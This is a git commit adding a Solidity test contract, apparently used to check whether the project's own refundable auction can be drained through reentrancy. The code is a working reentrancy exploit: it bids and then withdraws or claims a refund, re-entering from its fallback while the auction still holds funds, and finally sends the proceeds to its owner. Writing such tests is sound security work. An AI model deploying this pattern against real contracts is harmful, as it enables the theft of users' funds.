d37debedb770a04dbf1ad593ea8f3a76a1d22c43
zhaozhaoyuu <sarazhao28@gmail.com>
2023-11-07 18:20:10 +0800

    add attacker contract

---
+++ contracts/AttackContract.sol
@@ -0,0 +1,51 @@
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "./auction/RefundableAuctionImpl.sol";
+
+contract AttackContract {
+    RefundableAuctionImpl public auction;
+    uint256 public targetFunction; 
+    address payable public owner;
+    bool public isTest;
+
+    constructor(address payable _auctionAddress, bool _test, uint256 _targetFunction) {
+        require(_test, "AttackContract is for test only");
+        auction = RefundableAuctionImpl(_auctionAddress);
+        targetFunction = _targetFunction;
+        isTest = _test;
+        owner = payable(msg.sender);
+    }
+
+    //reentry attack start
+    function attack(uint256 _attackValue) external payable {
+        require(isTest, "AttackContract is only for test");
+        require(msg.value == _attackValue, "");
+
+        if (targetFunction == 0) {
+            auction.placeBids{value: _attackValue}();
+            auction.withdrawToken();
+        } else if (targetFunction == 1) {
+            auction.placeBids{value: _attackValue}();
+            auction.withdrawFunds();
+        } else if (targetFunction == 2) {
+            auction.placeBids{value: _attackValue}();
+            auction.claimRefund();
+        }
+    }
+
+    // Fallback
+    fallback() external payable {
+        if (targetFunction == 0 && address(auction).balance >= 1 ether) {
+            auction.withdrawToken();
+        } else if (targetFunction == 1 && address(auction).balance >= 1 ether) {
+            auction.withdrawFunds();
+        } else if (targetFunction == 2 && address(auction).balance >= 1 ether) {
+            auction.claimRefund();
+        } else {
+            owner.transfer(address(this).balance);
+        }
+    }
+
+    receive() external payable {}
+}
